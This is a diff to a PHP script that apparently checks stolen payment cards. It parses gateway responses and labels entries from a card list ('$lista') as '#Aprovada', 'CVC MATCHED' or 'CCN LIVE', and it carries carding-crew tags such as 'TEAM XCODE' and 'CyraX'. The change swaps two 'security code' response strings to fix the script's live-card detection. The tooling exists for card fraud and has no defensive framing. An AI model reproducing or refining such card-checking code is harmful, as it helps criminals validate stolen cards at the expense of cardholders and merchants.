@@ -247,7 +247,7 @@ elseif(strpos($result, "token" )) {
 elseif(strpos($result, "Thank You." )) {
   echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] </span></br>';
 }
-elseif(strpos($result, 'security code is incorrect.' )) {
+elseif(strpos($result, 'security code is invalid' )) {
   $ch = curl_init();
 //curl_setopt($ch, CURLOPT_PROXY, "http://ca");
 //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
@@ -256,7 +256,7 @@ elseif(strpos($result, 'security code is incorrect.' )) {
   curl_exec($ch);
   echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE CyraX</span></br>';
 }
-elseif(strpos($result, 'security code is invalid.' )) {
+elseif(strpos($result, 'security code is incorrect.' )) {
   echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]/span></br>';
 }
 elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
